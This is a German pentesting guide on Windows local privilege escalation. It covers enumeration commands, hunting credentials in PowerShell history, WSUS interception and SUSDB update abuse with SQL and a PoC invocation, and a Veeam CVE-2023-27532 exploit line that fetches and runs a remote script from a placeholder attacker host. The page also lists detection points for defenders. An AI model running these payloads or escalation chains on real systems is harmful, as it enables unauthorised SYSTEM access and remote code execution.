# Lokale Privilegienausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Auffinden von Vektoren zur lokalen Privilegienausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite bündelt allgemeine Methoden zur Privilegienausweitung unter Windows aus mehreren grundlegenden Anleitungen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Workshops und Checklisten aus der Community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Privilegienausweitung unter Windows.<sup>[[5]](#references)</sup>

## Grundlagen zu Windows

### Zugriffstoken

**Wenn du nicht weißt, was Windows-Zugriffstoken sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs – DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs – DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen unter Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Funktionen, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und alle diese **Abwehrmechanismen enumerieren**, bevor du mit der Enumeration zur Privilegienausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann auch dazu genutzt werden, eine Offline-Bearbeitung des UEFI-NVRAM in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Speicher-Patching-Kette umzuwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Aufforderungen High IL zu erreichen, wenn die AppInfo-Prüfungen sicherer Pfade umgangen werden. Den speziellen Ablauf zum Umgehen von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Accessibility-Registrierungseinstellungen für den Secure Desktop kann für beliebige SYSTEM-Registrierungsschreibvorgänge (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Pfad über **SMB auf beliebigen Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration der Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen aufweist (überprüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **riesige Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson integriert)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenziell relevante Advisories; prüfe das genaue Produkt und nachfolgende Updates, bevor du ein Ergebnis als zutreffend behandelst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die Architektur des Betriebssystems. Bei 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis gewährt. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein möglicher fehlender KB beweist nicht, dass ein Exploit funktioniert; vergleiche den laufenden Build, installierte oder nachfolgende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das genaue Problem.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [vom Client kontrollierte Offsets im MIDI-Ringpuffer im Shared Memory](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build; das Erlangen von `LOCAL SERVICE` ist vom späteren Schritt [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) zu `SYSTEM` zu unterscheiden.<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Anmeldedaten/Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie diese Funktion aktivieren: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell-Transkriptionsrichtlinie](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Ordner „Dokumente“ jedes Benutzers. Mit der Einstellung `OutputDirectory` oder `Start-Transcript -OutputDirectory` lassen sich Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfe vor dem Durchsehen eines Transkripts den tatsächlich verwendeten Ausgabepfad und die Datei-ACL: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein brauchbarer Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, darunter ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ergebnisse werden jedoch möglicherweise nicht erfasst.

Um diese Funktion zu aktivieren, folge den Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wähle **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowerShell-Protokollen anzuzeigen, kannst du Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitätsbericht und eine vollständige Aufzeichnung des Skriptinhalts werden erfasst. Dadurch wird sichergestellt, dass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail aller Aktivitäten, der für die Forensik und die Analyse schädlichen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logging-Ereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die frühere Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt zur Prüfung auf das Abfangen von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zunächst prüfen Sie, ob das Netzwerk WSUS-Updates ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Abfangpfad bestätigt. Es beweist jedoch nicht, dass ein Abfangen, die Annahme eines bösartigen Updates oder dessen Installation mit erhöhten Rechten möglich ist. Wenn der Wert auf `0` gesetzt ist, wird dieser WSUS-Endpunkt durch die Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um MiTM-Exploit-Skripte, mit denen gefälschte Updates in nicht per SSL geschützten WSUS-Datenverkehr eingeschleust werden können.

Lesen Sie die Forschung hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen nutzt dieser Bug die folgende Schwachstelle aus:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und auf unserem System Code als Benutzer mit erhöhten Rechten ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine „Trust on First Use“-Validierung des Zertifikats umzusetzen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den richtigen Hostnamen aufweist, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben wird).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen. Ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung für die Veröffentlichung](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das infrage kommende Update signiert und akzeptiert wird, für das Ziel gilt und in einem Kontext mit höheren Rechten installiert wird, bevor Sie dies als Privilegieneskalationspfad einstufen. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein weist diese Bedingungen nicht nach.

### Missbrauch benutzerdefinierter SUSDB-Updates: unsignierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die gespeicherten Prozeduren der **WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Zugangsweg ist das Weiterleiten eines WSUS-Computerkontos zu einem separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 zu LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [WSUS-HTTP für NTLM-Relay missbrauchen](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Externen Datenbank-Relay und Prozedurberechtigungen überprüfen

Prüfen Sie bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, zunächst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob das NTLM-Relay diesen Listener erreicht. Die SQL-Rolle des Servers kann Prozeduren zur Veröffentlichung von Updates zugänglich machen, selbst wenn direkte Schreibzugriffe auf Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` beweist nicht, dass die Veröffentlichung blockiert ist. Prüfen Sie die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen in einer autorisierten SQL-Sitzung, bevor Sie ein benutzerdefiniertes Update versuchen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind hilfreich, um gültige Update-Metadaten zu rekonstruieren. Für ein Bundle-Parent und ein Payload-Child sind jeweils `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`) erforderlich. Erfasse die lokale Revisions-ID, die jeder Aufruf von `spImportUpdate` zurückgibt, und achte darauf, dass die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent sind. Dies ist ein zustandsbehafteter Veröffentlichungs-Workflow; ein einzelner erfolgreicher Aufruf einer gespeicherten Prozedur ist kein Beleg für eine clientseitige Ausführung.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Veröffentlichungs-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| XML-Fragmente für Voraussetzungen, lokalisierte Eigenschaften und erweiterte Eigenschaften speichern | `spSaveXMLFragment` |
| Den Content-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem du die Content-URL und die Zielgruppe zugewiesen hast, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Deployment-IDs, anstatt die Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS weist beliebige unsignierte ausführbare Inhalte normalerweise zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Flag für die Zertifikatsprüfung auf false, wenn der angegebene Dateiname auf `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne zuvor nachzuweisen, dass es sich bei den Bytes um Text oder ein legitimes ESD-Image handelt. Daher kann ein unverändertes PE, das beispielsweise `payload.exe.txt` heißt, die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Type-Confusion-Bug, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatible Bereitstellung und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprungsserver muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt beim WSUS-Synchronisieren das Ereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und liefert `BitsWebServer.py` für die Bereitstellung des Inhalts mit. Ein minimaler Aufruf für ein autorisiertes Lab lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch erneute Versuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update weiterhin fehlgeschlagen/unvollständig war, sofort nach Beenden des Callback-Prozesses erneut angeboten. Das Verhalten bei erneuten Versuchen kann daher zu wiederkehrender Ausführung und Persistenz führen; dies ist auffällig, da der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Detection- und Hardening-Ansatzpunkte

Nützliche server- und clientseitige Ansatzpunkte aus dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` auditieren; neue Targeting-Gruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` und Deployments durch unerwartete Principals untersuchen (insbesondere durch Nicht-Computer-Konten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den falsch geschriebenen Eintrag `FileVerficationFailed` und `EventId=364` überprüfen; die Verifizierung anhand der Payload-Erweiterung und des Content-Magic-Werts abgleichen, statt dem Suffix zu vertrauen.
- Nach wiederholt fehlschlagenden/erneut gestarteten Windows-Update-Installationen sowie nach PE-Ausführung oder unerwarteter Child-/Netzwerkaktivität von Inhalten mit `.txt`- oder `.esd`-Namen suchen.
- Extended Protection for Authentication für den Datenbankdienst aktivieren, sofern unterstützt, und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Rechte für die benutzerdefinierten Update-Prozeduren minimieren und auditieren.

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agents stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn die Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer gefälschten Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Recon-Hinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und so beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version überprüfen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Der Sicherheitshinweis von Veeam](https://www.veeam.com/kb4424) beschreibt die nicht authentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Netzwerkperimeters des Backups; ein separater öffentlicher PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann an mehr als localhost gebunden sein. Überprüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Prüfen, ob TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten überprüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Hinweise, aber keine vollständige Patch-Prüfung.
- **Behobene Mindestversionen**: Veeam führt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste behobene Versionen auf; frühere Versionen sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch mit derselben Build-Nummer unterscheiden. Prüfen Sie die Patch-ID anhand der [Build-Historie des Anbieters](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als behoben einstufen.
- **Exploit**: Legen Sie einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ab und lösen Sie dann über den lokalen Socket einen SYSTEM-Payload aus:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Das zitierte PoC demonstriert die Befehlsausführung als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Anbieters beschreibt das Problem der Offenlegung von Anmeldedaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Schwachstelle für **local privilege escalation**. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird**, Benutzer über Selbstberechtigungen verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer zur Domäne hinzufügen können. Wichtig ist, dass diese **Voraussetzungen** bei Verwendung der **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos-Relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Verzeichnisschreibzugriff führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Prinzipal über Berechtigungen für das Zielobjekt verfügt. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) sowohl LDAP-Schreibzugriffe auf RBCD als auch auf `msDS-KeyCredentialLink` (Shadow Credentials); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert passende Delegierungs- und Zielobjektberechtigungen, während eine Shadow-Credential-Kette Schreibberechtigungen für Schlüsselanmeldeinformationen sowie einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner dieser Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

